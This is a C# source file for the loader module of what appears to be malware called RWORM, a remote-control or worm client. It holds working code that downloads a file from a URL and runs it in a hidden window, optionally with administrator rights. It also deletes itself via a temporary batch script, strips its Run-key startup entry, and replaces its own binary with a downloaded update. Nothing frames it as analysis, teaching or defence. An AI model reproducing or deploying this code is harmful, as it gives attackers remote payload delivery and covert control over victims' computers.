using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace RWORM.Client.Modules
{
    public static class LoaderModule
    {
        private static readonly HttpClient _http = new HttpClient
        {
            Timeout = TimeSpan.FromSeconds(60)
        };

        // Download URL, write to temp, run it. Returns result JSON bytes.
        public static async Task<byte[]> LoadAndExecute(string url, bool asAdmin = false)
        {
            try
            {
                var bytes = await _http.GetByteArrayAsync(url);
                var ext   = Path.GetExtension(new Uri(url).LocalPath);
                if (string.IsNullOrEmpty(ext)) ext = ".exe";
                var tmp   = Path.Combine(Path.GetTempPath(), $"rworm_ld_{Guid.NewGuid():N}{ext}");
                File.WriteAllBytes(tmp, bytes);

                var psi = new ProcessStartInfo
                {
                    FileName  = tmp,
                    UseShellExecute = true,
                    WindowStyle     = ProcessWindowStyle.Hidden,
                };
                if (asAdmin) psi.Verb = "runas";
                Process.Start(psi);
                return Utf8($"{{\"ok\":true,\"path\":\"{tmp.Replace("\\", "\\\\")}\"}}");
            }
            catch (Exception ex) { return Utf8($"{{\"error\":\"{ex.Message}\"}}"); }
        }

        // Delete self from disk, remove startup entries, exit.
        public static void Uninstall()
        {
            RemoveStartup();
            var self = Process.GetCurrentProcess().MainModule?.FileName ?? "";
            var bat  = Path.Combine(Path.GetTempPath(), "rworm_del.bat");
            File.WriteAllText(bat,
                $"@echo off\r\n" +
                $"ping 127.0.0.1 -n 3 > nul\r\n" +
                $"del /f /q \"{self}\"\r\n" +
                $"del /f /q \"%~f0\"\r\n");
            Process.Start(new ProcessStartInfo
            {
                FileName        = "cmd.exe",
                Arguments       = $"/c \"{bat}\"",
                UseShellExecute = false,
                CreateNoWindow  = true,
            });
            Environment.Exit(0);
        }

        // Replace self with downloaded version and restart.
        public static async Task Update(string url)
        {
            try
            {
                var bytes = await _http.GetByteArrayAsync(url);
                var self  = Process.GetCurrentProcess().MainModule?.FileName ?? "";
                var bak   = self + ".bak";
                var bat   = Path.Combine(Path.GetTempPath(), "rworm_upd.bat");
                File.WriteAllBytes(bak, bytes);
                File.WriteAllText(bat,
                    $"@echo off\r\n" +
                    $"ping 127.0.0.1 -n 3 > nul\r\n" +
                    $"copy /y \"{bak}\" \"{self}\"\r\n" +
                    $"del /f /q \"{bak}\"\r\n" +
                    $"start \"\" \"{self}\"\r\n" +
                    $"del /f /q \"%~f0\"\r\n");
                Process.Start(new ProcessStartInfo
                {
                    FileName  = "cmd.exe",
                    Arguments = $"/c \"{bat}\"",
                    UseShellExecute = false,
                    CreateNoWindow  = true,
                });
                Environment.Exit(0);
            }
            catch { }
        }

        private static void RemoveStartup()
        {
            try
            {
                using var rk = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(
                    @"Software\Microsoft\Windows\CurrentVersion\Run", writable: true);
                rk?.DeleteValue("RWORM", false);
            }
            catch { }
        }

        private static byte[] Utf8(string s) => Encoding.UTF8.GetBytes(s);
    }
}
